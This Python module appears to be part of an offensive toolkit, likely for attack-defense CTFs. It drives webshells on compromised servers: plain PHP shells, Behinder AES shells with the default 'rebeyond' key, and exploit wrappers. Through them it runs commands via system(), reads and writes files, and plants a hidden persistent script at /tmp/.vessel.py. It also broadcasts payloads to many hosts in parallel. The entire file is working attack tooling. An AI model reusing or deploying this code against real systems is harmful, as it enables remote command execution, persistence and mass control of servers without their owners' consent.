from traceback import print_exc
import threading
import random
import string
import logging
import base64
import requests
import time
import pathlib
import signal
import hashlib
import typing as t

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from .vessel_master import VesselEval

DIR = pathlib.Path(__file__).parent
Url, Payload = str, str


class FakeKeyboardInterrupt(KeyboardInterrupt):
    pass


def timeout_handler(signum, frame):
    raise FakeKeyboardInterrupt()


def function_with_timeout(func, timeout):
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
        func()
    except FakeKeyboardInterrupt:
        # 函数执行完毕后取消定时器
        signal.alarm(0)


def behinder_aes(payload, key):
    iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    payload = "1|" + payload
    payload = pad(payload.encode(), AES.block_size)
    return base64_encode(cipher.encrypt(payload))


def md5_encode(s):
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s):
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


def base64_decode(s):
    return base64.b64decode(s)


THREAD_NUM = 32

SUBMIT_WRAPPER_PHP = """echo '{delimiter_start_1}'.'{delimiter_start_2}';try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}echo '{delimiter_stop}';"""
SUBMIT_WRAPPER_LINUXSHELL = (
    "echo -n {delimiter_start}; ({payload_raw}); echo -n {delimiter_stop};"
)

__all__ = [
    "Session",
    "LinuxShellSession",
    "PHPWebshell",
    "PHPWebshellNormal",
    "PHPWebshellBehinderAES",
    "PHPWebshellExp",
    "PHPWebshellUser",
    "action_all",
    "submit_all",
]

class Session:
    def execute_cmd(self, cmd: str) -> t.Union[str, None]:
        raise NotImplementedError()


class LinuxShellSession(Session):
    def __init__(self, submit_raw):
        self.submit_raw = submit_raw
        self.info = {}

    def submit(self, payload_raw):
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_LINUXSHELL.format(
            delimiter_start=start,
            delimiter_stop=stop,
            payload_raw=payload_raw,
        )
        text = self.submit_raw(payload)
        idx_start, idx_stop = text.find(start), text.find(stop)
        if idx_start == -1 or idx_stop == -1 or idx_start >= idx_stop:
            logging.warning(
                "idx error: start=%d, stop=%d, text=%s", idx_start, idx_stop, repr(text)
            )
            return None
        return text[idx_start + len(start) : idx_stop]

    def getinfo(self):
        self.info["ok"] = "say 0k" in self.submit("echo say  0k")
        self.info["base64_exist"] = "/base64" in self.submit("which base64")
        self.info["python_exist"] = "/python3" in self.submit(
            "which python3"
        ) or "/python" in self.submit("which python")
        self.info["php_exist"] = "/php" in self.submit("which php")
        self.info["vessel_exist"] = "VESSEL_EXIST" in self.submit(
            "test -d /tmp/vessel && echo VESSEL_EXIST"
        ) and "514" in self.submit(
            "echo '114+400'>/tmp/vessel/c;echo EVAL>/tmp/vessel/s;sleep 0.1;cat /tmp/vessel/c"
        )
        return self.info

    def readfile_bytes(self, filename):
        if self.info.get("base64_exist", False):
            b = self.submit(f"base64 -w 0 {filename}")
            return base64_decode(b)
        else:
            return self.submit(f"cat {filename}").encode()

    def readfile(self, filename):
        return self.readfile_bytes(filename).decode("utf-8")

    def writefile_bytes(self, filename, content: bytes):
        if self.info.get("base64_exist", False):
            b = base64_encode(content)
            self.submit(f"echo {b}|base64 -d>{filename}")
        else:
            content = content.decode("utf-8")
            self.submit(f"echo {content}>{filename}")

    def writefile(self, filename, content: str):
        self.writefile_bytes(filename, content.encode("utf-8"))

    def vessel_rw(self, filename, content=None):
        print(filename, content[:50])
        if content is None:
            return self.readfile(filename)
        return self.writefile(filename, content)

    def vessel_eval(self):
        if self.info == {}:
            self.getinfo()
        assert self.info.get("vessel_exist", True)
        return VesselEval(self.vessel_rw)

    def plant_vessel(self):
        if self.info == {}:
            self.getinfo()
        with open(DIR / "vessel_slave.py", "rb") as f:
            vessel_content = f.read()
        self.writefile_bytes("/tmp/.vessel.py", vessel_content)
        if self.readfile_bytes("/tmp/.vessel.py") != vessel_content:
            return None
        logging.warning("Vessel script written.")
        function_with_timeout((lambda: self.submit("python3 /tmp/.vessel.py")), 10)
        logging.warning("Vessel script executed, checking...")
        self.info["vessel_exist"] = "VESSEL_EXIST" in self.submit(
            "test -d /tmp/vessel && echo VESSEL_EXIST"
        ) and "514" in self.submit(
            "echo '114+400'>/tmp/vessel/c;echo EVAL>/tmp/vessel/s;sleep 0.1;cat /tmp/vessel/c"
        )
        if self.info["vessel_exist"]:
            logging.warning("Vessel planted!")
            return self.vessel_eval()
        else:
            logging.warning("No vessel")
            return None


class PHPWebshell(Session):
    pass


class PHPWebshellMixin:
    def submit_raw(self, payload_raw: str) -> t.Tuple[int, str]:
        raise NotImplementedError()

    def execute_cmd(self, cmd: str) -> str:
        return self.submit(f"system({cmd!r});")

    def submit(self, payload: str) -> str:
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_PHP.format(
            delimiter_start_1=start[:3],
            delimiter_start_2=start[3:],
            delimiter_stop=stop,
            payload_raw=payload,
        )
        result = self.submit_raw(payload)
        if result is None:
            return None
        status_code, text = result
        if status_code != 200:
            logging.warning("status code error: %d", status_code)
            return None
        if "POSTEXEC_FAILED" in text:
            logging.warning("POSTEXEC_FAILED found, payload run failed")
            return None
        idx_start = text.find(start)
        if idx_start == -1:
            logging.warning("idx error: start=%d, text=%s", idx_start, repr(text))
            return None
        idx_stop_r = text[idx_start:].find(stop)
        if idx_stop_r == -1:
            logging.warning(
                "idx error: start=%d, stop_r=%d, text=%s",
                idx_start,
                idx_stop_r,
                repr(text),
            )
            return None
        idx_stop = idx_stop_r + idx_start
        return text[idx_start + len(start) : idx_stop]


class PHPWebshellNormal(PHPWebshellMixin, PHPWebshell):
    def __init__(
        self,
        method: str,
        url: str,
        password: str,
        params: t.Union[t.Dict, None] = None,
        data: t.Union[t.Dict, None] = None,
    ):
        self.method = method
        self.url = url
        self.password = password
        self.params = {} if params is None else params
        self.data = {} if data is None else data

    def __repr__(self) -> str:
        return f"session.PHPWebshellNormal(**{self.__dict__!r})"

    def submit_raw(self, payload):
        try:
            params = self.params.copy()
            data = self.data.copy()
            if self.method == "GET":
                params[self.password] = payload
            else:
                data[self.password] = payload
            resp = requests.request(
                method=self.method, url=self.url, params=params, data=data, timeout=10
            )
            return (resp.status_code, resp.text)
        except Exception:
            print_exc()
            return None


class PHPWebshellBehinderAES(PHPWebshellMixin, PHPWebshell):
    def __init__(self, url: str, password="rebeyond"):
        self.url = url
        self.key = md5_encode(password)[:16].encode()

    def submit_raw(self, payload):
        data = behinder_aes(payload, self.key)
        resp = requests.post(self.url, data=data)
        return resp.status_code, resp.text

    def __repr__(self) -> str:
        return f"session.PHPWebshellBehinderAES(url={repr(self.url)})"


class PHPWebshellExp(PHPWebshellMixin, PHPWebshell):
    def __init__(self, exp: t.Callable[[Url, Payload], t.Tuple[int, str]], url: str):
        """根据Exp函数获得Webshell session

        Args:
            exp (t.Callable[[Url, Payload], t.Tuple[int, str]]): exp函数
            url (str): url
        """
        self.exp = exp
        self.url = url
        self.submit_raw = lambda payload: exp(url=url, payload=payload)

    def __repr__(self) -> str:
        return f"session.PHPWebshellExp(url={repr(self.url)}, exp={self.exp.__name__})"


class PHPWebshellUser(PHPWebshellMixin, PHPWebshell):
    def __init__(self, submit_raw: t.Callable[[str], t.Tuple[int, str]]):
        """手动传入submit_raw函数

        Args:
            submit_raw (t.Callable[[str], t.Tuple[int, str]]): submit_raw函数，接收payload返回status_code和text
        """
        self.submit_raw = submit_raw

    def __repr__(self) -> str:
        return f"session.PHPWebshellUser(submit_raw={self.submit_raw.__name__})"


def action_all(sessions, action):
    threads = []
    for session in sessions:
        thread = threading.Thread(target=action, args=(session,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
        time.sleep(0.1)
        if len(threads) >= THREAD_NUM:
            t = threads.pop()
            try:
                t.join()
            except Exception:
                print_exc()
    for t in threads:
        try:
            t.join()
        except Exception:
            print_exc()


def submit_all(sessions, payload):
    def action_submit(session):
        session.submit(payload)

    action_all(sessions, action_submit)
